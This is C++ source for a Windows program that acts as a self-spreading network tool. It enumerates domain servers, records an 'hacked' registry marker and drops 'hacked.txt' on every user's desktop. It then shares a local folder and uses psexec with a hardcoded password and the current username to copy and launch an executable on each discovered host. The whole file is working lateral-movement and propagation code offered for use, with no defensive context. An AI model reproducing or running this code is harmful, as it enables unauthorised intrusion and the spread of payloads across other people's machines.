#ifndef _UNICODE
#define _UNICODE
#endif
#ifndef UNICODE
#define UNICODE
#endif
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <stdio.h>
#include <assert.h>
#include <cstdlib>
#include <ctime>
#include <algorithm>
#include <process.h>
#include <tchar.h>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h> 
#include <lm.h>
#include "./banned.h"

#pragma warning(disable:4996)
using namespace std;
bool anotherOne = false;

wchar_t ipstringbuffer[46];
string globIp[100];
int ips = 0;


#ifdef __MINGW32__
#else
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_DEPRECATE 1
#endif
#ifdef __MINGW32__
//https://github.com/coderforlife/mingw-unicode-main
#include "mingw-unicode.c"
#endif
class SCAN
{
public:

	int ex()
	{
		FILE* file_of_hosts;
		FILE* file_exclude_hosts;
		FILE* outputfile = nullptr;
		BOOL bReadFromFile = FALSE;
		BOOL bDomainspecified = FALSE;
		BOOL bCheckShareAccess = FALSE;
		BOOL bReadFromFileArg = FALSE;
		BOOL bDomainArg = FALSE;
		BOOL bOutputToFile = FALSE;
		wchar_t* domain = NULL;
		wchar_t* group = NULL;
		wchar_t* host = NULL;
		wchar_t* tempHost = NULL;
		int interval = 0;
		double jitter = 0;
		char* filename = nullptr;
		char* outputfilename;
		char line[255];
		char tmphost[255];
		vector<wstring> hosts;
		vector<wstring> users;
		vector<wstring> excludeHosts;

		setbuf(stdout, NULL);

		bDomainArg = TRUE;
		netview_enum(hosts, domain);

		for (vector<wstring>::iterator it = hosts.begin(); it != hosts.end(); ++it)
		{
			fflush(stdout);
			host = const_cast<wchar_t*>(it->c_str());
			BOOL excludeHost = FALSE;

			for (vector<wstring>::iterator it = excludeHosts.begin(); it != excludeHosts.end(); ++it) {
				tempHost = const_cast<wchar_t*>(it->c_str());
				if (!_wcsnicmp(host, tempHost, wcslen(host))) {
					excludeHost = TRUE;
				}
			}

			if (!excludeHost) {
				net_enum(host, domain);
				ip_enum(host);


				if (interval > 0.0) {
					srand(time(NULL));
					int min = (int)(interval * (1 - jitter));
					int max = (int)(interval * (1 + jitter));
					int range = max - min + 1;
					int sleep_time = rand() % range + min;
					printf("\n[*] Sleeping: %d seconds", sleep_time);

					Sleep(sleep_time * 1000);
				}
			}
		}

		if (bOutputToFile)
		{
			fclose(outputfile);
		}
		return 0;
	}
	void netview_enum(vector<wstring>& hosts, wchar_t* domain)
	{
		NET_API_STATUS nStatus;
		LPWSTR pszServerName = NULL;
		DWORD dwLevel = 101;
		LPSERVER_INFO_101 pBuf = NULL;
		LPSERVER_INFO_101 pTmpBuf;
		DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
		DWORD dwEntriesRead = 0;
		DWORD dwTotalEntries = 0;
		DWORD dwServerType = SV_TYPE_SERVER;
		LPWSTR pszDomainName = domain;
		DWORD dwResumeHandle = 0;


		nStatus = NetServerEnum(pszServerName,
			dwLevel,
			(LPBYTE*)&pBuf,
			dwPrefMaxLen,
			&dwEntriesRead,
			&dwTotalEntries,
			dwServerType,
			pszDomainName,
			&dwResumeHandle);

		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
		{
			if ((pTmpBuf = pBuf) != NULL)
			{
				for (unsigned int i = 0; i < dwEntriesRead; i++)
				{
					assert(pTmpBuf != NULL);
					if (pTmpBuf == NULL)
					{
						break;
					}
					else
					{
						hosts.push_back(wstring(pTmpBuf->sv101_name));
						pTmpBuf++;
					}
				}
			}
		}

		if (pBuf != NULL)
		{
			NetApiBufferFree(pBuf);
		}
	}
	void net_enum(wchar_t* host, wchar_t* domain)
	{
		NET_API_STATUS nStatus;
		LPWSTR pszServerName = host;
		DWORD dwLevel = 101;
		LPSERVER_INFO_101 pBuf = NULL;
		LPSERVER_INFO_101 pTmpBuf;

		nStatus = NetServerGetInfo(pszServerName,
			dwLevel,
			(LPBYTE*)&pBuf
		);

		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
		{
			if ((pTmpBuf = pBuf) != NULL)
			{
				assert(pTmpBuf != NULL);
				if (pTmpBuf == NULL)
				{
					return;
				}
			}
		}
		if (pBuf != NULL)
		{
			NetApiBufferFree(pBuf);
		}
	}
	void ip_enum(wchar_t* host)
	{

		WSADATA wsaData;
		int iResult;
		int iRetval;
		DWORD dwRetval;

#ifdef __MINGW32__	
		struct addrinfo* result = NULL;
		struct addrinfo* ptr = NULL;
		struct addrinfo hints;
#else
		ADDRINFOW* result = NULL;
		ADDRINFOW* ptr = NULL;
		ADDRINFOW hints;
#endif

		LPSOCKADDR sockaddr_ip;
		wchar_t ipstringbuffer[46];
		DWORD ipbufferlength = 46;

		iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
		if (iResult != 0)
		{
			return;
		}

		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family = AF_UNSPEC;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;


#ifdef __MINGW32__

		char tmphost[255];
		int len = 0;
		len = wcstombs(tmphost, host, sizeof(tmphost));
		dwRetval = getaddrinfo(tmphost, 0, &hints, &result);

#else
		dwRetval = GetAddrInfoW(host, 0, &hints, &result);
#endif

		if (dwRetval != 0)
		{
			WSACleanup();
			return;
		}
		else
		{
			// parse each address
			for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
			{
				switch (ptr->ai_family) {
				case AF_INET:
					sockaddr_ip = (LPSOCKADDR)ptr->ai_addr;
					ipbufferlength = 46;
					iRetval = WSAAddressToString(sockaddr_ip, (DWORD)ptr->ai_addrlen, NULL, ipstringbuffer, &ipbufferlength);
					if (iRetval)
						wprintf(L"WSAAddressToString failed with %u\n", WSAGetLastError());
					else {
						wstring ws(ipstringbuffer);
						globIp[ips] = string(ws.begin(), ws.end());
						++ips;
					}
					break;
				}
			}
#ifdef __MINGW32__
			freeaddrinfo(result);
#else
			FreeAddrInfoW(result);
#endif		

			WSACleanup();
		}
	}
	bool CanAccessFolder(LPCTSTR folderName, DWORD genericAccessRights)
	{
		bool bRet = false;
		DWORD length = 0;
		if (!::GetFileSecurity(folderName, OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION
			| DACL_SECURITY_INFORMATION, NULL, NULL, &length) &&
			ERROR_INSUFFICIENT_BUFFER == ::GetLastError()) {
			PSECURITY_DESCRIPTOR security = static_cast<PSECURITY_DESCRIPTOR>(::malloc(length));
			if (security && ::GetFileSecurity(folderName, OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION
				| DACL_SECURITY_INFORMATION, security, length, &length)) {
				HANDLE hToken = NULL;
				if (::OpenProcessToken(::GetCurrentProcess(), TOKEN_IMPERSONATE | TOKEN_QUERY |
					TOKEN_DUPLICATE | STANDARD_RIGHTS_READ, &hToken)) {
					HANDLE hImpersonatedToken = NULL;
					if (::DuplicateToken(hToken, SecurityImpersonation, &hImpersonatedToken)) {
						GENERIC_MAPPING mapping = { 0xFFFFFFFF };
						PRIVILEGE_SET privileges = { 0 };
						DWORD grantedAccess = 0, privilegesLength = sizeof(privileges);
						BOOL result = FALSE;

						mapping.GenericRead = FILE_GENERIC_READ;
						mapping.GenericWrite = FILE_GENERIC_WRITE;
						mapping.GenericExecute = FILE_GENERIC_EXECUTE;
						mapping.GenericAll = FILE_ALL_ACCESS;

						::MapGenericMask(&genericAccessRights, &mapping);
						if (::AccessCheck(security, hImpersonatedToken, genericAccessRights,
							&mapping, &privileges, &privilegesLength, &grantedAccess, &result)) {
							bRet = (result == TRUE);
						}
						::CloseHandle(hImpersonatedToken);
					}
					::CloseHandle(hToken);
				}
				::free(security);
			}
		}

		return bRet;
	}
};

class Directory
{
public:
	bool isDirectory(LPCSTR folderpath);
	bool Create(wchar_t path[]);

};

bool Directory::isDirectory(LPCSTR folderpath)
{
	DWORD dwFileAttributes = GetFileAttributesA(folderpath);
	if (dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY || dwFileAttributes == 22)
		return true;
	return false;
}
bool Directory::Create(wchar_t path[])
{
	return CreateDirectory(path, NULL);
}

class Reg
{
public:
	bool Query(_TCHAR path[], HKEY& hKey);
	bool Create(char text[], HKEY& hKey, _TCHAR path[]);
};

bool Reg::Query(_TCHAR path[], HKEY& hKey)
{
	HKEY WhereIsMyMind = HKEY_LOCAL_MACHINE;
	bool answer = RegOpenKeyEx(WhereIsMyMind, L"Software\\1\\", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS && \
		RegQueryValueEx(hKey, TEXT("hacked"), NULL, NULL, NULL, NULL) == ERROR_SUCCESS;
	if (answer)
		RegCloseKey(hKey);
	return answer;
}

bool Reg::Create(char text[], HKEY& hKey, _TCHAR path[])
{
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, path, 0, NULL, REG_OPTION_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
	RegSetValueEx(hKey, (LPCWSTR)text, 0, REG_SZ, NULL, NULL);
	return RegSetValue;
}



int main()
{
	Reg reg;
	Directory direct;
	SCAN a;
	TCHAR buf[MAX_PATH];
	GetCurrentDirectory(sizeof(buf), buf);
	wstring test(&buf[0]);
	string localpath(test.begin(), test.end());
	string filename = "123123123123123123123.exe";
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserNameA((LPSTR)username, &username_len);
	string password = "Qw123456";

	_TCHAR path[] = _T("Software\\1\\");
	HKEY hKey = 0;
	HKEY WhereIsMyMind = HKEY_LOCAL_MACHINE;

	if (reg.Query(path, hKey))
	{
		cout << "It was hacked before." << endl;
	}
	else
	{
		cout << "Starting process:" << endl;

		cout << "Register: ";
		char text[] = "hacked";
		reg.Create(text, hKey, path);
		if (hKey == ERROR_SUCCESS)
			cout << "BAD" << endl;
		else
			cout << "COMPLETE" << endl;
		RegCloseKey(hKey);

		cout << "Desktop: ";
		if (system("@echo off && for /d %i in (c:\\users\\*) do (echo hacked > \"%i\\desktop\\hacked.txt\")"))
			cout << "BAD";
		else
			cout << "COMPLETE";
		cout << endl;

		cout << "Folder: ";
		wchar_t path[] = L"C:\\fromhacked";
		if (direct.isDirectory((LPSTR)path))
		{
			cout << "ALREADY EXIST";
		}
		else
		{
			if (direct.Create(path))
				cout << "GOOD";
			else
				cout << "BAD";
		}
		cout << endl;
		Sleep(200);
		system("net share Pack=c:/fromhacked");


		cout << endl << "Start Scan IP: " << endl;
		a.ex();
		for (int i = 0; i < ips; i++)
		{
			cout << globIp[i] << " - ";
			LONG err;
			for (int j = 0; j < ips; j++)
			{
				if (i != j)
				{
					err = WinExec(string("c:\\ps\\psexec.exe \\\\" + globIp[i] + " cmd /c \"net use j: \\\\" + globIp[j] + "\\Pack " + password + " /user:%userdomain%\\" + username + " /y && cd C:\\fromhacked && xcopy j: /f && j: && " + filename + " && net use j: /delete /y\"").c_str(), SW_SHOW);
				}
			}
			if (err == 2)
			{
				cout << "EXE ERROR...";

			}
			else
			{
				cout << "ACTIVATED EXE";
			}
			cout << " - " << err;
			cout << endl;
			Sleep(2000);
		}

		cout << endl;
		system("net share Pack /delete /y");

	}
	cout << "Stop processing.." << endl;
	system("pause");
	return 0;
}
